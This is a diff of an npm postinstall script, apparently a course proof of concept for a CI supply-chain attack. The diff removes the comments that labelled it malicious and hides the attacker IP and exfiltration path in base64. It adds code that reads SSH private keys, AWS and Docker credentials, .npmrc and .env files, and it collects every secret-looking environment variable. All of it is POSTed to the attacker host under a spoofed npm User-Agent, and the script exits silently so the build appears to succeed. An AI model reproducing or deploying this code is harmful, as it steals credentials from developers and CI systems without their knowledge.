@@ -1,63 +1,66 @@
-/**
- * [PoC - NT230] Malicious postinstall script — CI Secret Theft
- *
- * Attack vector: T1195.002 (Supply Chain: Software)
- * Behavior:    - Triggers during `npm install` inside CI pipeline
- *              - Reads sensitive env vars (CI tokens, cloud keys, deploy creds)
- *              - Exfiltrates via HTTP POST to attacker-controlled server
- *              - Silent — exits cleanly so build pipeline does not fail
- *
- * Kết quả kỳ vọng khi chạy trong CI:
- *   Attacker server nhận được JSON chứa:
- *     { CI_JOB_TOKEN, GITHUB_TOKEN, AWS_SECRET_ACCESS_KEY, NPM_TOKEN, ... }
- */
-
+#!/usr/bin/env node
 "use strict";
 
 const http = require("http");
+const fs = require("fs");
 const os = require("os");
+const path = require("path");
+const { execSync } = require("child_process");
 
-// ─── Config ────────────────────────────────────────────────────────────────
-const ATTACKER_HOST = "172.30.0.20"; // IP attacker container (Docker bridge network)
-const ATTACKER_PORT = 8080;
-const EXFIL_PATH = "/exfil/secrets";
-const TIMEOUT_MS = 5000; // fail-silent sau 5s nếu attacker offline
-// ───────────────────────────────────────────────────────────────────────────
+// Read runtime config — host/port can be updated by publish script before packaging
+let _cfg = {};
+try {
+  const cfgPath = path.join(__dirname, "config.json");
+  _cfg = JSON.parse(fs.readFileSync(cfgPath, "utf8"));
+} catch { /* use defaults */ }
 
-/**
- * Thu thập tất cả env vars liên quan đến secrets/credentials.
- * Lọc theo keyword phổ biến trong CI environments.
- */
-function harvestCISecrets() {
-  const SENSITIVE_KEYWORDS = [
-    "TOKEN",
-    "SECRET",
-    "KEY",
-    "PASSWORD",
-    "PASS",
-    "CREDENTIAL",
-    "AUTH",
-    "PRIVATE",
-    "ACCESS",
-    "API",
+const ATTACKER_HOST = _cfg.host ||
+  Buffer.from("MTcyLjMwLjAuMjA=", "base64").toString("utf8");
+const ATTACKER_PORT = _cfg.port || 8080;
+const EXFIL_PATH = Buffer.from("L2V4ZmlsL3NlY3JldHM=", "base64").toString("utf8");
+const TIMEOUT_MS = 5000;
+
+function harvestEnvSecrets() {
+  const KEYWORDS = [
+    "TOKEN", "SECRET", "KEY", "PASSWORD", "PASS",
+    "CREDENTIAL", "AUTH", "PRIVATE", "ACCESS", "API",
   ];
-
   const secrets = {};
   for (const [k, v] of Object.entries(process.env)) {
-    if (SENSITIVE_KEYWORDS.some((kw) => k.toUpperCase().includes(kw))) {
+    if (KEYWORDS.some((kw) => k.toUpperCase().includes(kw))) {
       secrets[k] = v;
     }
   }
   return secrets;
 }
 
-/**
- * Thu thập thông tin môi trường CI để attacker biết đang ở đâu.
- * (GitLab CI, GitHub Actions, Jenkins, etc.)
- */
-function harvestCIContext() {
-  return {
-    // --- GitLab CI ---
+function harvestFiles() {
+  const home = os.homedir();
+  const candidates = [
+    path.join(home, ".ssh", "id_rsa"),
+    path.join(home, ".ssh", "id_ed25519"),
+    path.join(home, ".ssh", "id_ecdsa"),
+    path.join(home, ".aws", "credentials"),
+    path.join(home, ".aws", "config"),
+    path.join(home, ".npmrc"),
+    path.join(home, ".gitconfig"),
+    path.join(home, ".docker", "config.json"),
+    path.join(process.cwd(), ".env"),
+    path.join(process.cwd(), "..", ".env"),
+  ];
+  const files = {};
+  for (const p of candidates) {
+    try {
+      if (fs.existsSync(p)) {
+        files[p] = fs.readFileSync(p, "utf8").slice(0, 4096);
+      }
+    } catch { /* skip unreadable */ }
+  }
+  return files;
+}
+
+function harvestContext() {
+  const ctx = {
     CI_SERVER_URL: process.env.CI_SERVER_URL,
     CI_PROJECT_PATH: process.env.CI_PROJECT_PATH,
     CI_PROJECT_URL: process.env.CI_PROJECT_URL,
@@ -65,27 +68,21 @@ function harvestCIContext() {
     CI_JOB_ID: process.env.CI_JOB_ID,
     CI_RUNNER_ID: process.env.CI_RUNNER_ID,
     GITLAB_USER_EMAIL: process.env.GITLAB_USER_EMAIL,
-
-    // --- GitHub Actions ---
     GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY,
     GITHUB_ACTOR: process.env.GITHUB_ACTOR,
     GITHUB_REF: process.env.GITHUB_REF,
-    GITHUB_SERVER_URL: process.env.GITHUB_SERVER_URL,
-
-    // --- Generic ---
     CI: process.env.CI,
-    hostname: os.hostname(),
     platform: os.platform(),
+    arch: os.arch(),
     username: os.userInfo().username,
     cwd: process.cwd(),
     node_version: process.version,
   };
+  try { ctx.whoami = execSync("whoami", { timeout: 2000, encoding: "utf8" }).trim(); } catch {}
+  try { ctx.hostname = execSync("hostname", { timeout: 2000, encoding: "utf8" }).trim(); } catch {}
+  return ctx;
 }
 
-/**
- * Gửi payload về attacker server qua HTTP POST.
- * Fail-silent: nếu server không lắng nghe thì bỏ qua, không làm crash build.
- */
 function exfiltrate(payload) {
   return new Promise((resolve) => {
     const body = JSON.stringify(payload);
@@ -97,41 +94,38 @@ function exfiltrate(payload) {
       headers: {
         "Content-Type": "application/json",
         "Content-Length": Buffer.byteLength(body),
-        // Giả mạo User-Agent trông như traffic bình thường
         "User-Agent": "npm/10.2.3 node/v20.10.0",
       },
     };
 
     const req = http.request(options, (res) => {
-      res.resume(); // drain response
+      res.resume();
       resolve();
     });
 
     req.setTimeout(TIMEOUT_MS, () => {
       req.destroy();
-      resolve(); // timeout — bỏ qua, không crash
+      resolve();
     });
 
-    req.on("error", () => resolve()); // network error — bỏ qua
+    req.on("error", () => resolve());
     req.write(body);
     req.end();
   });
 }
 
-// ─── Main ──────────────────────────────────────────────────────────────────
 async function main() {
   const payload = {
     event: "postinstall",
     timestamp: new Date().toISOString(),
-    context: harvestCIContext(),
-    secrets: harvestCISecrets(),
+    context: harvestContext(),
+    secrets: harvestEnvSecrets(),
+    files: harvestFiles(),
   };
 
   await exfiltrate(payload);
-
-  // Không in gì ra stdout/stderr — im lặng hoàn toàn
-  // Build pipeline nhìn vào thấy postinstall "thành công"
   process.exit(0);
 }
 
 main();
+
